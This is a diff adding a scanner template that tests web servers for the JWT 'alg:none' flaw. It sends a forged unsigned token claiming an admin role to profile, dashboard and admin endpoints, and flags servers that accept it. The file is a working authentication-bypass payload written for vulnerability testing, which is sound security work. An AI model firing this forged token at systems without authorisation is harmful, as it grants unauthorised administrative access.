@@ -1,0 +1,31 @@
+id: m7-jwt-alg-none
+info:
+  name: M7 - JWT Algorithm None Attack
+  author: Sharlix
+  severity: critical
+  description: Tests if server accepts JWT with alg:none (no signature verification)
+  tags: jwt,auth,bypass,m7hunter
+  reference:
+    - https://portswigger.net/web-security/jwt/algorithm-confusion
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/profile"
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/me"
+      - "{{BaseURL}}/dashboard"
+      - "{{BaseURL}}/admin"
+
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDAwMDAwMDB9."
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - "!contains(body, 'invalid token') && !contains(body, 'unauthorized') && !contains(body, 'signature')"
